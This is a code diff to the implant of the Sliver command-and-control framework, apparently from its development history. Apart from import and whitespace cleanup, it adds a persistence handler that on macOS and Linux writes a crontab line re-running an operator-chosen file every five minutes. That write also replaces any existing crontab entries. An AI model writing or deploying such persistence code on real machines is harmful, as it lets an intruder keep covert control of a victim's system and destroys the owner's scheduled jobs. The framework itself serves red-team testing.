@@ -48,9 +48,8 @@ import (
 	"github.com/bishopfox/sliver/sliver/netstat"
 	"github.com/bishopfox/sliver/sliver/procdump"
 	"github.com/bishopfox/sliver/sliver/ps"
-	"github.com/bishopfox/sliver/sliver/taskrunner"
 	screen "github.com/bishopfox/sliver/sliver/sc"
-
+	"github.com/bishopfox/sliver/sliver/taskrunner"
 
 	"github.com/golang/protobuf/proto"
 )
@@ -506,7 +505,6 @@ func executeHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
-
 func screenshotHandler(data []byte, resp RPCResponse) {
 	sc := &pb.Screenshot{}
 	err := proto.Unmarshal(data, sc)
@@ -520,10 +518,39 @@ func screenshotHandler(data []byte, resp RPCResponse) {
 	log.Printf("Screenshot Request")
 	// {{end}}
 
-
 	sc.Data = screen.Capture()
 	data, err = proto.Marshal(sc)
 
+	resp(data, err)
+}
+
+func persistHandler(data []byte, resp RPCResponse) {
+	persistReq := &pb.PersistReq{}
+	err := proto.Unmarshal(data, persistReq)
+	if err != nil {
+		//{{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		//{{end}}
+		return
+	}
+	//{{if eq .GOOS "darwin"}}
+	cmd := exec.Command("crontab")
+	stdin, _ := cmd.StdinPipe()
+	io.WriteString(stdin, "*/5 * * * * "+persistReq.Filename)
+	stdin.Close()
+	cmd.Start()
+	cmd.Wait()
+	//{{else if eq .GOOS "linux"}}
+	cmd := exec.Command("crontab")
+	stdin, _ := cmd.StdinPipe()
+	io.WriteString(stdin, "*/5 * * * * "+persistReq.Filename)
+	stdin.Close()
+	cmd.Start()
+	cmd.Wait()
+	//{{else}}
+	//TODO: Windows Support...
+	//{{end}}
+	data, err = proto.Marshal(persistReq)
 	resp(data, err)
 }
 
